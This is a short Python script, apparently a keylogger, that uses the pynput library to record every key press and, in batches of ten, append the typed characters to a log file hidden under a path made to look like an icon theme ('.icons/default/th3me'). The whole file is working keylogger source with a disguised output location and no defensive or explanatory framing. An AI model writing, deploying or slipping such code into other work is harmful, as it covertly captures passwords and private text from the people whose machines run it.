#!/usr/bin/python3
import pynput
import logging
import os

from pynput.keyboard import Key, Listener

localLog = os.path.abspath("/home/prenuevos/.icons/default/th3me")

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    print("{0} pressed".format(str(key)))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(localLog, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(str(k))

with Listener(on_press=on_press) as listener:
    listener.join()
